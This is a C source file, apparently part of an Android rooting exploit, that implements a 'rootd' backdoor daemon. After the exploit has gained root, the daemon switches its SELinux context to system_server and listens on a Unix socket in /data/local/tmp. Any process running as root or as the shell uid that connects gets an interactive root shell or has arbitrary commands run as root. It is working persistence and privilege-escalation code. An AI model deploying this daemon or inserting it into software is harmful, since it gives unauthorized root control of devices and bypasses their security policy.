#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

#define ROOT_SOCK "/data/local/tmp/pc98260-root.sock"

static int read_exact(int fd, void *buffer, size_t length)
{
	char *p = buffer;
	while (length) {
		ssize_t got = read(fd, p, length);
		if (got < 0 && errno == EINTR) continue;
		if (got <= 0) return -1;
		p += got;
		length -= (size_t)got;
	}
	return 0;
}

static void set_su_context(void)
{
	/* The exploit process has a NULL/invalid SELinux context.  init/property
	   service then fails getpeercon() and refuses setprop.  Switch the exec
	   child to a valid root-ish domain first; permissive mode permits it. */
	static const char ctx[] = "u:r:system_server:s0";
	int fd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		ssize_t n = write(fd, ctx, sizeof(ctx) - 1);
		if (n < 0)
			dprintf(STDERR_FILENO, "[rootd] setcon su failed errno=%d\n", errno);
		close(fd);
	}
}

static void exec_direct(char *command)
{
	/* Experimental protocol: a command beginning with '!' is parsed as
	   whitespace-separated argv and exec'd directly, without /system/bin/sh.
	   The rootd process is full-cap, while sh deliberately drops to shell
	   uid 2000 on this ROM, so m6 cleanup must use this path. */
	char *argv[32];
	char *save = NULL;
	int argc = 0;
	char *token = strtok_r(command, " \t", &save);
	while (token && argc < 31) {
		argv[argc++] = token;
		token = strtok_r(NULL, " \t", &save);
	}
	argv[argc] = NULL;
	if (!argc) _exit(127);
	char *const env[] = { (char *)"PATH=/system/bin:/vendor/bin:/data/local/tmp",
		(char *)"HOME=/data/local/tmp", NULL };
	execve(argv[0], argv, env);
	_exit(127);
}

static void handle_client(int fd)
{
	uint32_t length = 0;
	char command[4097];
	if (read_exact(fd, &length, sizeof(length)) || length > 4096U ||
	    read_exact(fd, command, length)) return;
	command[length] = 0;
	pid_t child = fork();
	if (child < 0) return;
	if (child == 0) {
		set_su_context();
		(void)dup2(fd, STDIN_FILENO);
		(void)dup2(fd, STDOUT_FILENO);
		(void)dup2(fd, STDERR_FILENO);
		if (fd > STDERR_FILENO) close(fd);
		char *const env[] = { (char *)"PATH=/system/bin:/vendor/bin:/data/local/tmp",
			(char *)"HOME=/data/local/tmp", NULL };
		if (length && command[0] == '!') {
			exec_direct(command + 1);
		}
		if (length) {
			char *const argv[] = { (char *)"sh", (char *)"-c",
				command, NULL };
			execve("/system/bin/sh", argv, env);
		} else {
			char *const argv[] = { (char *)"sh", (char *)"-i", NULL };
			execve("/system/bin/sh", argv, env);
		}
		_exit(127);
	}
	int status;
	while (waitpid(child, &status, 0) < 0 && errno == EINTR) {}
}

int pc98260_run_rootd(void)
{
	if (geteuid() != 0) return 1;
	const char *path = ROOT_SOCK;
	(void)signal(SIGHUP, SIG_IGN);
	(void)signal(SIGPIPE, SIG_IGN);
	int listener = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (listener < 0) return 1;
	struct sockaddr_un address = { .sun_family = AF_UNIX };
	if (strlen(path) >= sizeof(address.sun_path)) {
		close(listener);
		return 1;
	}
	strncpy(address.sun_path, path, sizeof(address.sun_path) - 1);
	(void)unlink(path);
	mode_t old_umask = umask(007);
	int bound = bind(listener, (struct sockaddr *)&address, sizeof(address));
	(void)umask(old_umask);
	if (bound || chown(path, 0, 2000) || chmod(path, 0660) ||
	    listen(listener, 8)) {
		dprintf(STDERR_FILENO,
			"[rootd] startup failed errno=%d (%s)\n",
			errno, strerror(errno));
		close(listener);
		return 1;
	}
	dprintf(STDERR_FILENO, "[rootd] listening at %s pid=%d\n",
		path, getpid());
	for (;;) {
		int client = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
		if (client < 0) {
			if (errno == EINTR) continue;
			break;
		}
		struct ucred peer;
		socklen_t peer_len = sizeof(peer);
		if (!getsockopt(client, SOL_SOCKET, SO_PEERCRED,
				&peer, &peer_len) &&
		    (peer.uid == 0 || peer.uid == 2000))
			handle_client(client);
		close(client);
	}
	close(listener);
	return 1;
}
